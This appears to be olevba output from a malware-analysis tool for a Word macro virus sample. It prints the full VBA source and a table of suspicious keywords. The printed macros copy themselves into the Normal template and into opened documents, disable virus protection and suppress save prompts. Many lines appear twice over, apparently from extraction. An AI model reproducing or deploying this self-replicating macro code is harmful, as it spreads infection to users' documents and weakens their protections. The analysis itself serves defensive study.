olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.r-06969f427df6db77d8bbfb102fa566a0c3e63bd7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.r-06969f427df6db77d8bbfb102fa566a0c3e63bd7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.EnableCancelKey = wdCancelDisabled
With Options:
With Options:
    .ConfirmConversions = False:
    .ConfirmConversions = False:
    .VirusProtection = True:
    .VirusProtection = True:
    .SaveNormalPrompt = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
    .SavePropertiesPrompt = False:
End With
End With
s = ActiveDocument.Saved
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
sFunc = "Private Sub Document_Open()"
Found = False
Found = False
If Dir(sName) <> "" Then Kill sName
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Found = False And (a = sFunc) Then Found = True
    If Found = False And (a = sFunc) Then Found = True
    If a <> "" And Found = True Then Print #1, a
    If a <> "" And Found = True Then Print #1, a
    If a = "End Sub" And Found = True Then Found = False
    If a = "End Sub" And Found = True Then Found = False
Next i
Close #1
Close #1
j = 1
j = 1
k = 1
k = 1
t = 0
t = 0
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
    t = t + 1
    t = t + 1
End If
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    t = t + 2
    t = t + 2
End If
End If
If t > 0 Then
If t > 0 Then
    Open sName For Input As #1
    Open sName For Input As #1
    If LOF(1) = 0 Then GoTo quit
    If LOF(1) = 0 Then GoTo quit
    i = 1
    i = 1
    Do While Not EOF(1)
    Do While Not EOF(1)
        Line Input #1, a
        Line Input #1, a
        If t = 1 Or t = 3 Then
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            nml.CodeModule.InsertLines j, a
            j = j + 1
            j = j + 1
        End If
        End If
        If t = 2 Or t = 3 Then
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            atv.CodeModule.InsertLines k, a
            k = k + 1
            k = k + 1
        End If
        End If
    Loop
    Loop
quit:
    Close #1
    Close #1
End If
End If
With Dialogs(wdDialogFileSumaryInfo):
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Keywrds = "Ethan":
    .Execute:
    .Execute:
End With
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Private Sub Document_Close()
On Error GoTo skam
Options.VirusProtection = False
SWLABS99
skam:
End Sub
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

